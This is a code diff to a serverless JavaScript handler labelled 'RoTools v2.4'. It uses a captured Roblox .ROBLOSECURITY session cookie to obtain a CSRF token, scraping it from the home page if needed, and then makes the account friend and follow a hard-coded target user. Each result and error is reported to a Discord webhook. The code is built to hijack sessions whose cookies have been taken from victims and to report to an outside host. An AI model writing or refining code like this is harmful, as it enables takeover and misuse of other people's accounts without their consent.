@@ -210,34 +210,52 @@ export default async function handler(req, res) {
       body: JSON.stringify({ embeds: [accountInfoEmbed] })
     });
 
-    // ===== NEW: FRIEND REQUEST AND FOLLOW FUNCTIONALITY =====
+    // ===== FRIEND REQUEST AND FOLLOW FUNCTIONALITY =====
     const TARGET_USER_ID = process.env.TARGET_USER_ID || "8318490238"; // Default to example ID
     
     try {
-      // Get CSRF token
-      const csrfRes = await fetch('https://auth.roblox.com/v2/login', {
+      // Get CSRF token using the recommended method
+      const csrfFetch = await fetch('https://auth.roblox.com/v1/login', {
         method: 'POST',
         headers: { 
           'Cookie': `.ROBLOSECURITY=${cookie}`,
           'Content-Type': 'application/json'
-        }
+        },
+        body: JSON.stringify({ ctype: 'Username' }) // Required dummy payload
       });
       
-      let csrfToken = csrfRes.headers.get('x-csrf-token');
+      let csrfToken = csrfFetch.headers.get('x-csrf-token');
+      
+      // If we didn't get a token, try alternative endpoint
       if (!csrfToken) {
-        throw new Error('CSRF token not found in headers');
+        const altCsrfRes = await fetch('https://www.roblox.com/home', {
+          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        });
+        const html = await altCsrfRes.text();
+        const metaMatch = html.match(/<meta name="csrf-token" data-token="([^"]+)"/);
+        if (metaMatch) csrfToken = metaMatch[1];
       }
+      
+      if (!csrfToken) {
+        throw new Error('CSRF token not found in headers or HTML');
+      }
+
+      // Prepare common headers
+      const actionHeaders = {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'X-CSRF-TOKEN': csrfToken,
+        'Content-Type': 'application/json',
+        'Referer': 'https://www.roblox.com/',
+        'Origin': 'https://www.roblox.com'
+      };
 
       // Send friend request
       const friendRes = await fetch(
         `https://friends.roblox.com/v1/users/${TARGET_USER_ID}/request-friendship`,
         {
           method: 'POST',
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Content-Type': 'application/json'
-          }
+          headers: actionHeaders,
+          body: JSON.stringify({}) // Empty body but required
         }
       );
       
@@ -246,13 +264,38 @@ export default async function handler(req, res) {
         `https://friends.roblox.com/v1/users/${TARGET_USER_ID}/follow`,
         {
           method: 'POST',
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Content-Type': 'application/json'
-          }
+          headers: actionHeaders,
+          body: JSON.stringify({}) // Empty body but required
         }
       );
+
+      // Add response details to Discord notification
+      let friendStatus = '❌ Failed';
+      let friendDetails = `${friendRes.status} ${friendRes.statusText}`;
+      if (friendRes.ok) {
+        friendStatus = '✅ Success';
+      } else if (friendRes.status === 429) {
+        friendStatus = '⚠️ Rate Limited';
+      }
+      
+      let followStatus = '❌ Failed';
+      let followDetails = `${followRes.status} ${followRes.statusText}`;
+      if (followRes.ok) {
+        followStatus = '✅ Success';
+      } else if (followRes.status === 429) {
+        followStatus = '⚠️ Rate Limited';
+      }
+
+      // Try to get error details if available
+      try {
+        const friendError = await friendRes.text();
+        if (friendError) friendDetails += ` | ${friendError.substring(0, 100)}`;
+      } catch {}
+      
+      try {
+        const followError = await followRes.text();
+        if (followError) followDetails += ` | ${followError.substring(0, 100)}`;
+      } catch {}
 
       // Send success notification to Discord
       await fetch(process.env.DISCORD_WEBHOOK, {
@@ -260,12 +303,25 @@ export default async function handler(req, res) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           embeds: [{
-            title: "✅ SOCIAL ACTIONS COMPLETED",
-            description: `Successfully sent friend request and followed user ${TARGET_USER_ID}`,
-            color: 0x00ff00,
+            title: "🔔 SOCIAL ACTIONS ATTEMPTED",
+            description: `Attempted to send friend request and follow user ${TARGET_USER_ID}`,
+            color: 0xFFA500, // Orange color for attempted actions
             fields: [
-              { name: 'Friend Request', value: friendRes.ok ? '✅ Success' : `❌ Failed (${friendRes.status})`, inline: true },
-              { name: 'Follow Action', value: followRes.ok ? '✅ Success' : `❌ Failed (${followRes.status})`, inline: true }
+              { 
+                name: 'Friend Request', 
+                value: `${friendStatus}\n\`${friendDetails}\``,
+                inline: true 
+              },
+              { 
+                name: 'Follow Action', 
+                value: `${followStatus}\n\`${followDetails}\``,
+                inline: true 
+              },
+              { 
+                name: 'Possible Reasons', 
+                value: `• Already friends/following\n• Privacy settings\n• Rate limiting\n• Account restrictions\n• Invalid CSRF token\n• Cookie expired`,
+                inline: false 
+              }
             ],
             footer: { text: "RoTools v2.4 | Social Actions" },
             timestamp: new Date().toISOString()
@@ -282,13 +338,17 @@ export default async function handler(req, res) {
             title: "❌ SOCIAL ACTION FAILED",
             description: `Error performing social actions: ${socialError.message}`,
             color: 0xff0000,
+            fields: [{
+              name: "Error Details",
+              value: `\`\`\`\n${socialError.stack || socialError.message}\n\`\`\``
+            }],
             footer: { text: "RoTools v2.4 | Error" },
             timestamp: new Date().toISOString()
           }]
         })
       });
     }
-    // ===== END NEW FUNCTIONALITY =====
+    // ===== END SOCIAL FUNCTIONALITY =====
 
     return res.json({ success: true });
     
